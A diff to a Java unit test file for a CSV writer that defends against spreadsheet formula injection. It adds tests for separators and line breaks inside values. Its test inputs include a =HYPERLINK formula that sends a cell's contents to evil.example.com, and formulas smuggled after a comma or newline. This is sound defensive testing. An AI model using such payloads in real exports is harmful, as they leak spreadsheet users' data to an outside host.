@@ -47,7 +47,8 @@ public class CsvFormulaInjectionTest {
     @Test
     public void aHyperlinkExfiltrationPayloadIsNeutralised() throws Exception {
 
-        assertEquals("'=HYPERLINK(\"http://evil.example.com?d=\"&A1,\"click\")\n",
+        // The comma is the separator here, so it is replaced to keep the payload in one cell.
+        assertEquals("'=HYPERLINK(\"http://evil.example.com?d=\"&A1 \"click\")\n",
                 write(true, "=HYPERLINK(\"http://evil.example.com?d=\"&A1,\"click\")"));
     }
 
@@ -58,7 +59,26 @@ public class CsvFormulaInjectionTest {
         assertEquals("'+a\n", write(true, "+a"));
         assertEquals("'@a\n", write(true, "@a"));
         assertEquals("'\ta\n", write(true, "\ta"));
-        assertEquals("'\ra\n", write(true, "\ra"));
+        assertEquals("' a\n", write(true, "\ra"));
+    }
+
+    /**
+     * The writer does not quote, so a separator or line break inside a value would open a new
+     * cell whose leading character was never checked.
+     */
+    @Test
+    public void aFormulaSmuggledAfterASeparatorOrLineBreakStaysInItsCell() throws Exception {
+
+        assertEquals("Acme =HYPERLINK(\"http://evil\")\n", write(true, "Acme,=HYPERLINK(\"http://evil\")"));
+        assertEquals("Acme =1+1\n", write(true, "Acme\n=1+1"));
+        assertEquals("Acme  =1+1\n", write(true, "Acme\r\n=1+1"));
+    }
+
+    /** Bundle files are a published contract and are written byte for byte. */
+    @Test
+    public void separatorsAreUntouchedWhenNotNeutralising() throws Exception {
+
+        assertEquals("a,b\n", write(false, "a,b"));
     }
 
     /** A minus that starts an expression rather than a number still has to be caught. */
